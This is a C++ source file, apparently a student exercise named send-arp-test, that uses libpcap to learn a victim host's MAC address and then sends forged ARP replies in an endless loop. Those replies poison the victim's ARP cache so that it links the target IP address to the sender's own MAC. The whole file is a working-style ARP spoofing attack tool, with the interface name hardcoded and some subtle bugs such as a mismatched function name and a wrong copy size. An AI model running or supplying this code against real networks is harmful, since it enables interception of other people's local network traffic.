#include <cstdio>
//#include <signal.h>
#include <stdlib.h>
#include <pcap/pcap.h>
#include <sys/types.h>          //for socket
#include <sys/socket.h>         //for socket
#include <sys/ioctl.h>          //for ioctl function
#include <arpa/inet.h>
#include <linux/if_ether.h>     //for ETH_P_ARP
#include <net/if.h>             //for ioctl third argument
//#include <netinet/in.h>
#include <unistd.h>             //for close function
#include <string.h>
//#include <netinet/if_ether.h>
//#include <net/ethernet.h>
#include <netinet/ether.h>
//#include <errno.h>
#include "ethhdr.h"
#include "arphdr.h"
#pragma pack(push, 1)

struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};

struct libnet_ethernet_hdr
{
    u_int8_t  ether_dhost[ETHER_ADDR_LEN];/* destination ethernet address */
    u_int8_t  ether_shost[ETHER_ADDR_LEN];/* source ethernet address */
    u_int16_t ether_type;                 /* protocol */
};
#pragma pack(pop)

int getMy_Ip(char *my_ip);
int getMacAddress(uint8_t *mac);
void convrt_mac(const char *data, char *cvrt_str, int sz);
void usage() {
	printf("syntax: send-arp-test <interface> <send ip> <target ip>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
      
    uint8_t me_mac[6];
    uint8_t you_mac[6]={0,};
    char my_ip[20];
    //Get my mac
    printf("get mac address function start \n");
    getMacAddress(me_mac);
    printf("get mac address function finish \n");
    getMy_IP(my_ip);          
    //ARP request 'Get You mac'
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ =Mac(me_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(me_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(argv[2]));
    EthArpPacket reply_packet;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    while(1)
    {


    printf("for you mac arpreply\n");

        struct pcap_pkthdr* header;
        const u_char* capacket;
        res = pcap_next_ex(handle, &header, &capacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
            }

        reply_packet= *(EthArpPacket*)capacket;
        if (reply_packet.eth_.type_ == htons(EthHdr::Arp)){
            if(reply_packet.arp_.op_== htons(ArpHdr::Reply))
            {
                printf("arp reply!!!\n");
                break;
            }
        }
    sleep(2);
    }
    memcpy(you_mac, reply_packet.arp_.smac_, 6);


    //ARP Spoofing
    EthArpPacket Spoofing_packet;
    Spoofing_packet.eth_.dmac_ = Mac(you_mac);
    Spoofing_packet.eth_.smac_ = Mac(me_mac);
    Spoofing_packet.eth_.type_ = htons(EthHdr::Arp);

    Spoofing_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    Spoofing_packet.arp_.pro_ = htons(EthHdr::Ip4);
    Spoofing_packet.arp_.hln_ = Mac::SIZE;
    Spoofing_packet.arp_.pln_ = Ip::SIZE;
    Spoofing_packet.arp_.op_ = htons(ArpHdr::Reply);
    Spoofing_packet.arp_.smac_ = Mac(me_mac);
    Spoofing_packet.arp_.sip_ = htonl(Ip(argv[3]));
    Spoofing_packet.arp_.tmac_ = Mac(you_mac);
    Spoofing_packet.arp_.tip_ = htonl(Ip(argv[2]));

    //Send arp reply packet
    while(1)
    {
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Spoofing_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("ARP Spoofing ~\n ");
        sleep(1);
    }
pcap_close(handle);
}
int getMy_IP(char *my_ip)
{
    int sock;
    struct ifreq ifr;


    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        close(sock);
        return -1;
    }
    printf("socket good\n");
    strcpy(ifr.ifr_name, "enp0s3");
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0)
    {
        perror("ioctl() - get ip");
        close(sock);
        return -1;
    }
    struct sockaddr_in *addr;
    addr =(struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(my_ip, inet_ntoa(addr-> sin_addr), sizeof(ifr.ifr_addr));
    close(sock);
    return 1;

}


int getMacAddress(uint8_t *mac)
{
    int sock;
    struct ifreq ifr;


    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        close(sock);
        return -1;
    }
    printf("socket good\n");
    strcpy(ifr.ifr_name, "enp0s3");
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0)
    {
        perror("ioctl() - get mac");
        close(sock);
        return -1;
    }
    printf("before mm\n");
    memcpy(mac, ifr.ifr_hwaddr.sa_data,6);
    printf("before okm\n");

    close(sock);
    return 1;
}


